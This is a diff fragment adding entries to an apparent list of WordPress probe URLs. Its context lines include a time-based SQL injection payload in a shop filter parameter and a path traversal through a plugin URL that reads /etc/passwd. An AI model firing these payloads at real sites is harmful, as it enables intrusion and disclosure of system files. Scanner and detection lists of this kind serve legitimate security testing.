@@ -118,3 +118,5 @@
 /shop/?filter_post_author=1%27%20AND%20SLEEP(6)%20AND%20%271%27%3D%271
 /wp-content/plugins/ioncube-tester-plus/readme.txt
 /wp-content/plugins/ioncube-tester-plus/loader-wizard.php?page=phpconfig&download=1&ininame=../../../../../../../../etc/passwd
+/wp-content/plugins/my-calendar/readme.txt
+/wp-admin/admin-ajax.php?action=mcjs_action&behavior=loadupcoming&args&site=1
